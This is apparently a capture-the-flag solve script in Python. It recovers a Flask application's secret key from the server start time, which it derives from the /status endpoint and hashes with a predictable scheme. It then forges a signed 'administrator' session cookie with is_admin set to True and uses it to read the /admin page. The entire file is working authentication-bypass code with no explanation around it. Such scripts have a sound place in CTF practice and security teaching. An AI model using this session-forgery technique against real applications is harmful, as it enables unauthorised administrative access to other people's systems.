from flask import Flask, request, render_template, jsonify, abort, redirect, session
import uuid
import requests
import hashlib
from datetime import datetime, timedelta
from flask.sessions import SecureCookieSessionInterface

URL = 'http://chal.competitivecyber.club:9999'

status_response = requests.get(f"{URL}/status")
status_text = status_response.text

lines = status_text.split("<br>")
uptime_str = lines[0].split(": ")[1].strip()
server_time_str = lines[1].split(": ")[1].strip()
print(uptime_str)
print(server_time_str)

uptime_parts = list(map(int, uptime_str.split(":")))  # [hours, minutes, seconds]
uptime_delta = timedelta(hours=uptime_parts[0], minutes=uptime_parts[1], seconds=uptime_parts[2])

server_time = datetime.strptime(server_time_str, '%Y-%m-%d %H:%M:%S')

server_start_time = server_time - uptime_delta 
server_start_time = server_start_time - timedelta(seconds=1)

server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
print(server_start_str)

secret_key_str = f'secret_key_{server_start_str}'
secret_key = hashlib.sha256(secret_key_str.encode()).hexdigest()
print(secret_key)
# Step 3: Create a valid session cookie with 'administrator' as the username


# Manually craft the session dictionary
session_data = {
    'username': 'administrator',
    'uid': str(uuid.uuid5(uuid.UUID('31333337-1337-1337-1337-133713371337'), 'administrator')),
    'is_admin': True
}


app = Flask(__name__)
app.secret_key = secret_key
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)

cookie_value = serializer.dumps(session_data)

cookies = {
    'session': cookie_value
}

admin_response = requests.get(f"{URL}/admin", cookies=cookies)

if admin_response.status_code == 200:
    print("Flag:", admin_response.text)
else:
    print(f"Failed to retrieve the flag. Status code: {admin_response.status_code}")

